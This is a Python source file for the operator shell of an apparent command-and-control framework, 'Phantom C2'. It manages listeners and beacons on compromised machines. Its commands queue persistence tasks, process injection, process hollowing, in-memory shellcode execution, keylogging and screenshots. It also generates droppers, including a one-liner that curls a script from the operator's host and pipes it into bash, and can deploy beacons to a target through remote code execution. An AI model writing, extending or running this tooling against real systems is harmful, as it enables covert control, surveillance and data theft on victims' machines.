import cmd
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

from phantom.core.c2_server import server_instance, c2_state
from phantom.core.session import session
from phantom.utils.notifier import notifier
from phantom.utils.c2_helpers import BEACON_COMMANDS, format_beacon_output

console = Console()


def _resolve_beacon_id(bid: str) -> str | None:
    """Match beacon by full or prefix ID."""
    beacons = c2_state.get_beacons()
    if bid in beacons:
        return bid
    matches = [k for k in beacons if k.startswith(bid)]
    if len(matches) == 1:
        return matches[0]
    return None

def build_c2_banner():
    return r"""
[bold magenta]
  ██████╗██████╗     ██████╗ ██████╗ ██████╗ ███████╗
 ██╔════╝╚════██╗   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 ██║      █████╔╝   ██║     ██║   ██║██████╔╝█████╗  
 ██║     ██╔═══╝    ██║     ██║   ██║██╔══██╗██╔══╝  
 ╚██████╗███████╗██╗╚██████╗╚██████╔╝██║  ██║███████╗
  ╚═════╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
[/bold magenta]
  [dim]──────────────────────────────────────────────────────────[/dim]
  [bold magenta]Phantom C2 Operations Center[/bold magenta]  [dim]v1.0.0[/dim]
  [dim]Secure Encrypted Asynchronous Communications[/dim]
"""

class C2Shell(cmd.Cmd):
    intro = ""
    prompt = "\033[1;35mC2\033[0m > "

    def __init__(self):
        super().__init__()
        self.active_beacon = None

    def preloop(self):
        console.print(build_c2_banner())
        notifier.status("C2 Shell initialized. Type 'help' for commands.")

    def postcmd(self, stop, line):
        if self.active_beacon:
            beacons = c2_state.get_beacons()
            info = beacons.get(self.active_beacon, {})
            last_seen_str = info.get("last_seen", "")
            
            status_color = "\033[31m" # Red
            if last_seen_str:
                last_seen_dt = datetime.fromisoformat(last_seen_str)
                diff = (datetime.now() - last_seen_dt).total_seconds()
                if diff < 15: status_color = "\033[32m" # Green
                elif diff < 60: status_color = "\033[33m" # Yellow
            
            self.prompt = f"\033[1;35mC2\033[0m ({status_color}{self.active_beacon}\033[0m) > "
        else:
            self.prompt = "\033[1;35mC2\033[0m > "
        return stop

    def do_listeners(self, arg):
        """listeners [start <port> [host] [use_ssl]] | stop] - Manage C2 listener."""
        parts = arg.split()
        if not parts:
            if server_instance.thread and server_instance.thread.is_alive():
                proto = "HTTPS" if server_instance.use_ssl else "HTTP"
                console.print(f"[*] Listener [green]ACTIVE[/green] ({proto}) on {server_instance.host}:{server_instance.port}")
            else:
                console.print("[*] Listener [red]INACTIVE[/red]")
            return

        action = parts[0]
        if action == "start":
            try:
                port = int(parts[1]) if len(parts) > 1 else (session.lport or 8080)
                host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
                use_ssl = parts[3].lower() in ("true", "1", "yes", "https") if len(parts) > 3 else False
                server_instance.start(host=host, port=port, use_ssl=use_ssl)
                proto = "HTTPS" if use_ssl else "HTTP"
                notifier.success(f"Started {proto} listener on {host}:{port}")
            except Exception as e:
                notifier.error(f"Failed to start listener: {e}")
        elif action == "stop":
            server_instance.stop()
            notifier.success("Stopped listener")
        else:
            notifier.error("Usage: listeners start [port] [host] [use_ssl] | listeners stop")

    def do_beacons(self, arg):
        """beacons - list active beacons with real-time status"""
        beacons = c2_state.get_beacons()
        if not beacons:
            notifier.warn("No active beacons.")
            return

        table = Table(title="Active Beacons", border_style="magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Status", justify="center")
        table.add_column("Source IP", style="green")
        table.add_column("User@Host", style="magenta")
        table.add_column("OS", style="blue")
        table.add_column("Last Seen", style="yellow")
        
        now = datetime.now()
        for bid, info in beacons.items():
            last_seen_str = info.get("last_seen", "")
            status = "[red]OFFLINE[/]"
            
            if last_seen_str:
                last_seen_dt = datetime.fromisoformat(last_seen_str)
                diff = (now - last_seen_dt).total_seconds()
                
                if diff < 15: # Se visto negli ultimi 15 secondi (sleep 5s + jitter)
                    status = "[green]ACTIVE[/]"
                elif diff < 60:
                    status = "[yellow]STALE[/]"
                
                last_seen_display = f"{int(diff)}s ago"
            else:
                last_seen_display = "Never"
            
            user = info.get("user", "")
            host = info.get("hostname", "")
            user_host = f"{user}@{host}" if user or host else "Unknown"
            
            table.add_row(
                bid, 
                status,
                info.get("ip", "Unknown"), 
                user_host,
                info.get("os", "Unknown"),
                last_seen_display
            )
            
        console.print(table)

    def do_payloads(self, arg):
        """payloads [id] - list compiled payload droppers (optionally show one by id)"""
        from phantom.utils.payload_manager import get_custom_beacons

        history = get_custom_beacons()
        if not history:
            notifier.warn("No compiled payloads in history.")
            return

        bid = arg.strip()
        if bid:
            matches = [e for e in history if e.get("id", "").startswith(bid)]
            if not matches:
                notifier.error(f"No payload found with id '{bid}'.")
                return
            if len(matches) > 1:
                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
                return
            entry = matches[0]
            console.print(Panel(
                entry.get("command", ""),
                title=f"[bold]{entry.get('platform', 'unknown').upper()}[/] — {entry.get('description', '')}",
                subtitle=f"Created: {entry.get('created_at', 'Unknown')}  |  Source: {entry.get('source', 'unknown')}",
                border_style="magenta",
            ))
            return

        table = Table(title="Compiled Payload History", border_style="magenta")
        table.add_column("ID", style="cyan", no_wrap=True)
        table.add_column("Platform", style="green")
        table.add_column("Description", style="white")
        table.add_column("Source", style="dim")
        table.add_column("Created", style="yellow")
        table.add_column("Command Preview", style="dim", overflow="fold")

        for entry in reversed(history):
            cmd = entry.get("command", "")
            preview = (cmd[:60] + "...") if len(cmd) > 63 else cmd
            table.add_row(
                entry.get("id", "")[:8] + "...",
                entry.get("platform", "unknown"),
                entry.get("description", ""),
                entry.get("source", ""),
                entry.get("created_at", ""),
                preview,
            )

        console.print(table)
        console.print("[dim]Use 'payloads <full-id>' to view the complete dropper command.[/dim]")

    def do_interact(self, arg):
        """interact <beacon_id> - drop into beacon interaction mode (prefix match supported)"""
        bid = arg.strip()
        if not bid:
            notifier.error("Usage: interact <beacon_id>")
            return
        resolved = _resolve_beacon_id(bid)
        if not resolved:
            matches = [k for k in c2_state.get_beacons() if k.startswith(bid)]
            if len(matches) > 1:
                notifier.error(f"Ambiguous id '{bid}' — {len(matches)} matches. Use more characters.")
            else:
                notifier.error("Invalid or missing Beacon ID.")
            return

        self.active_beacon = resolved
        notifier.success(f"Interacting with beacon {resolved}")
        console.print("[dim]Type 'beacon-help' for agent commands. Use 'results' after tasks complete.[/dim]")

    def do_back(self, arg):
        """back - return to main C2 shell from interaction mode"""
        if self.active_beacon:
            self.active_beacon = None
            notifier.success("Returned to global C2 context.")
        else:
            notifier.warn("Already in global context.")

    def default(self, line):
        """Execute a command on the active beacon and wait for result."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        # Queue the task
        task_id = c2_state.queue_task(self.active_beacon, line)
        notifier.info(f"Task queued. ID: {task_id}. Waiting for result...")
        
        # Poll for result automatically
        self._wait_for_result(task_id)

    def do_results(self, arg):
        """results [n|all] - show results for the active beacon (default last 10)"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        results = c2_state.get_results(self.active_beacon)
        if not results:
            notifier.warn("No results available for this beacon.")
            return

        # Handle filtering
        limit = 10
        show_all = False
        if arg.strip():
            if arg.strip().lower() == "all":
                show_all = True
            else:
                try:
                    limit = int(arg.strip())
                except ValueError:
                    notifier.error("Usage: results [n|all]")
                    return

        to_show = results if show_all else results[-limit:]
        
        if not show_all and len(results) > limit:
            console.print(f"[dim]Showing last {limit} results (out of {len(results)}). Use 'results all' to see everything.[/dim]")

        for res in to_show:
            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ({res.get('time', 'Unknown')}) ---[/]")
            display, extra = format_beacon_output(res["output"])
            console.print(display)
            if extra:
                notifier.success(extra)

    def do_persist(self, arg):
        """persist [runkey|schtask|cron|systemd] - Generate and queue a persistence task for the active beacon."""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        parts = arg.split()
        if not parts:
            notifier.error("Usage: persist [runkey|schtask|cron|systemd]")
            return

        method = parts[0]
        beacons = c2_state.get_beacons()
        info = beacons.get(self.active_beacon, {})
        os_type = info.get("os", "").lower()
        
        # Determine current binary path (best guess)
        # In a real scenario, we might want to move the beacon first.
        # For now, let's assume we use the current path or ask the user.
        binary_path = input("[?] Full path of the beacon on target: ").strip()
        if not binary_path:
            notifier.error("Path is required for persistence.")
            return

        from phantom.core.persistence import persistence_manager
        cmd = ""
        if method == "runkey": 
            # Use native persistence instead of shell command
            cmd = "persist PhantomBeacon"
        elif method == "schtask": 
            cmd = persistence_manager.get_windows_schtask(binary_path)
        elif method == "cron": 
            cmd = persistence_manager.get_linux_cron(binary_path)
        elif method == "systemd": 
            cmd = persistence_manager.get_linux_systemd(binary_path)
        elif method == "native":
            cmd = "persist PhantomUpdate"
        else:
            notifier.error(f"Unknown persistence method: {method}")
            return

        if cmd:
            task_id = c2_state.queue_task(self.active_beacon, cmd if cmd.startswith("persist") else f"shell {cmd}")
            notifier.success(f"Persistence task queued: {method}")
            notifier.info(f"Task ID: {task_id}")

    def do_beacon_help(self, arg):
        """beacon-help - list commands supported by the C++ beacon agent"""
        console.print(Panel(BEACON_COMMANDS, title="[bold]Beacon Agent Commands[/]", border_style="magenta"))

    def do_autopersist(self, arg):
        """autopersist - Automatically attempt persistence based on OS detection."""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        # Auto-detect OS from beacon info
        beacons = c2_state.get_beacons()
        os_type = beacons.get(self.active_beacon, {}).get("os", "").lower()
        
        # Default to systemd for linux/android, runkey for windows
        if "windows" in os_type:
            method = "runkey"
        else:
            method = "systemd"
            
        notifier.info(f"Auto-detecting persistence method for {os_type}: {method}")
        # Note: Needs a path. Using a dummy path for auto-detection demo, 
        # normally we should detect the binary path via recon.
        task_id = c2_state.queue_task(self.active_beacon, f"persist {method}")
        notifier.success(f"Auto-persistence ({method}) task queued (ID: {task_id})")

    def do_generate_shellcode(self, arg):
        """generate_shellcode [platform] - Generate Base64 shellcode for inject/migrate."""
        import os
        import base64
        import phantom
        
        platform = arg.strip() or "windows"
        
        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
        if platform == "windows":
            beacon_path = os.path.join(beacon_dir, "beacon.bin")
        else:
            from phantom.utils.builder import _PLATFORM_OUT
            if platform not in _PLATFORM_OUT:
                from rich.console import Console
                console = Console()
                console.print(f"[red]Invalid platform. Choose from: {list(_PLATFORM_OUT.keys())}[/red]")
                return
            beacon_path = os.path.join(beacon_dir, _PLATFORM_OUT[platform])
        
        if not os.path.exists(beacon_path):
            notifier.error(f"Beacon binary not found at {beacon_path}. Run 'generate {platform}' first.")
            return
            
        with open(beacon_path, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
            
        from rich.console import Console
        from rich.panel import Panel
        console = Console()
        console.print(Panel(b64, title=f"Base64 Shellcode ({platform})", border_style="green"))
        console.print("[dim]Copy this string to use with 'inject <pid> <string>' or 'migrate <string>'[/dim]")

    def _wait_for_result(self, task_id, timeout=30):
        """Helper to poll for a specific task result."""
        import time
        from phantom.utils.c2_helpers import format_beacon_output
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            results = c2_state.get_results(self.active_beacon)
            for res in reversed(results):
                if res['task_id'] == task_id:
                    display, extra = format_beacon_output(res["output"])
                    console.print(f"\n[bold green]Result for Task {task_id}:[/]")
                    console.print(display)
                    if extra: notifier.success(extra)
                    return True
            time.sleep(1) # Poll every second
        
        notifier.warn(f"Task {task_id} queued but result not ready. Check later with 'results'.")
        return False

    def _beacon_platform(self) -> str:
        """Detect active beacon platform from its ID prefix."""
        if not self.active_beacon:
            return ""
        bid = self.active_beacon.upper()
        if bid.startswith("WIN"): return "windows"
        if bid.startswith("LNX"): return "linux"
        if bid.startswith("AND"): return "android"
        return ""

    def _inject_payload_path(self, platform: str) -> str:
        """Return path to platform-specific XOR'd inject payload."""
        import os
        import phantom
        beacon_dir = os.path.join(os.path.dirname(phantom.__file__), "payloads", "beacon")
        mapping = {
            "windows": "beacon_xored.bin",
            "linux": "beacon_linux_xored.bin",
            "android": "beacon_android_xored.bin",
        }
        return os.path.join(beacon_dir, mapping.get(platform, ""))

    def do_inject(self, arg):
        """inject <pid> - Inject beacon into a remote process.
        
        Auto-detects platform and uses the appropriate pre-compiled payload.
        On Linux/Android, writes ELF to /tmp and injects execve stub via ptrace.
        """
        import os
        import base64
        import phantom
        
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        platform = self._beacon_platform()
        
        parts = arg.split()
        if len(parts) == 2:
            pid, b64 = parts
        elif len(parts) == 1:
            pid = parts[0]
            beacon_path = self._inject_payload_path(platform)
            if not beacon_path or not os.path.exists(beacon_path):
                notifier.error(f"Inject payload not found for {platform}. Run 'generate {platform}' first.")
                return
            with open(beacon_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()
        else:
            notifier.error("Usage: inject <pid> [base64_shellcode]")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"inject {pid} {b64}")
        notifier.info(f"Injection task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_migrate(self, arg):
        """migrate [pid] - Migrate beacon into a new process.
        
        Auto-detects platform: Windows uses process hollowing,
        Linux/Android writes ELF to /tmp, forks, and injects execve stub.
        """
        import os
        import base64
        import phantom
        
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        platform = self._beacon_platform()
        parts = arg.split()
        
        if len(parts) >= 1:
            # Accept optional PID arg (ignored on Linux/Android)
            beacon_path = self._inject_payload_path(platform)
            if not beacon_path or not os.path.exists(beacon_path):
                notifier.error(f"Migrate payload not found for {platform}. Run 'generate {platform}' first.")
                return
            with open(beacon_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()
        else:
            notifier.error("Usage: migrate [pid]")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"migrate {b64}")
        notifier.info(f"Migration task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_mem_run(self, arg):
        """mem-run <b64_shellcode> - Execute shellcode in memory (Windows/Linux)."""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
            
        b64 = arg.strip()
        if not b64:
            notifier.error("Usage: mem-run <base64_shellcode>")
            return
            
        task_id = c2_state.queue_task(self.active_beacon, f"mem-run {b64}")
        notifier.info(f"Memory execution task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_keylog(self, arg):
        """keylog <start|stop|status|dump> - Manage keylogger instance (Windows only)"""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        parts = arg.split()
        if not parts or parts[0] not in ["start", "stop", "status", "dump"]:
            notifier.error("Usage: keylog <start|stop|status|dump [filter]>")
            return
            
        cmd = f"keylog {parts[0]}"
        if parts[0] == "dump" and len(parts) > 1:
            cmd += " " + " ".join(parts[1:])
        task_id = c2_state.queue_task(self.active_beacon, cmd)
        notifier.info(f"Keylog {parts[0]} task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_screenshot(self, arg):
        """screenshot - Capture a screenshot of the target (Windows only)"""
        if not self.active_beacon:
            notifier.error("No active beacon.")
            return
        
        task_id = c2_state.queue_task(self.active_beacon, "screenshot")
        notifier.info(f"Screenshot task queued (ID: {task_id}). Waiting for output...")
        self._wait_for_result(task_id)

    def do_generate(self, arg):
        """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
        import os
        from phantom.utils.network import get_lhost
        from phantom.core.session import session
        
        parts = arg.strip().split()
        platform = parts[0].lower() if parts else ""
        arch = parts[1].lower() if len(parts) > 1 else ""

        if not platform:
            # Check scan results for OS clues
            scan_res = session.get_result("scan") or {}
            all_text = str(scan_res).lower()
            if "linux" in all_text or "unix" in all_text:
                platform = "linux"
                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
            elif "windows" in all_text:
                platform = "windows"
                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
            else:
                import sys
                valid_platforms_local = ["windows", "linux", "macos", "android"]
                if sys.stdin.isatty():
                    try:
                        from phantom.utils.interactive import select_option
                        choice = select_option("No platform detected. Select platform:", valid_platforms_local, default_index=0)
                    except Exception:
                        choice = None

                    if choice:
                        platform = choice
                    else:
                        notifier.warn("No platform selected; aborting generation.")
                        return
                else:
                    notifier.warn("No platform detected and non-interactive session. Defaulting to 'windows'.")
                    platform = "windows"
        
        valid_platforms = ["windows", "linux", "macos", "android"]
        if platform not in valid_platforms:
            notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
            return
            
        # Architecture selection
        if not arch:
            if platform in ["linux", "windows"]:
                import sys
                if sys.stdin.isatty():
                    try:
                        from phantom.utils.interactive import select_option
                        arch = select_option(f"Select architecture for {platform}:", ["x64", "x86"], default_index=0)
                    except Exception:
                        arch = "x64"
                else:
                    arch = "x64"
            else:
                arch = "x64"
        
        from phantom.utils.builder import compile_beacon, generate_dropper
        from phantom.utils.payload_manager import add_custom_beacon

        import phantom
        pkg_root = os.path.dirname(phantom.__file__)
        host = session.lhost or get_lhost()
        port = int(session.lport) or (server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 8080)
        use_ssl = server_instance.use_ssl if (server_instance.thread and server_instance.thread.is_alive()) else False
        
        # Compile and generate dropper
        try:
            beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch, host=host, port=port, use_ssl=use_ssl)
        except Exception as e:
            notifier.error(f"Compilation process crashed: {e}")
            return
            
        if not beacon_path:
            return
        if not (server_instance.thread and server_instance.thread.is_alive()):
            notifier.warn(f"Listener not active. Run: listeners start {port}")

        dropper = generate_dropper(platform, host, port, arch=arch, use_ssl=use_ssl)
        if not dropper:
            notifier.error(f"Failed to generate dropper for {platform}")
            return

        # Show short one-liner for Android (user types it manually on phone)
        if platform == "android":
            proto = "https" if use_ssl else "http"
            dropper = f"bash -c \"\$(curl -sk '{proto}://{host}:{port}/s/android')\""

        # Display and Register
        title_map = {
            "windows": "PowerShell Dropper (Windows)",
            "linux": "Bash Dropper (Linux)",
            "macos": "Bash Dropper (macOS)",
            "android": "ADB Dropper (Android)"
        }
        style_map = {
            "windows": "green",
            "linux": "cyan",
            "macos": "yellow",
            "android": "red"
        }

        console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')} ({arch})[/]", border_style=style_map.get(platform, "white")))
        add_custom_beacon(platform, dropper, f"Custom C++ Beacon ({arch})", source="c2_shell")

        # Ask for automatic deployment
        if session.target:
            console.print()
            deploy_choice = input(f"[?] Deploy to {session.target} now? [y/N]: ").strip().lower()
            
            if deploy_choice == 'y':
                from phantom.utils.rce_deployer import deploy_beacon
                console.print("\n[*] Initiating intelligent RCE deployment...")
                success = deploy_beacon(session.target, dropper)
                
                if success:
                    notifier.success(f"Beacon deployed to {session.target}. Check beacons list.")
                    # Give time for beacon to callback
                    import time
                    time.sleep(2)
                else:
                    notifier.warn("Deployment via RCE failed. Copy command manually or try another method.")
            else:
                notifier.info("Beacon command ready. Run it manually on the target.")
        else:
            notifier.info("No target set. Run the command manually or set target first with 'set target <ip>'")

    def do_exit(self, arg):
        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
        console.print("[dim]Stopping listener...[/]")
        server_instance.stop()
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

def run_c2():
    try:
        shell = C2Shell()
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
        server_instance.stop()
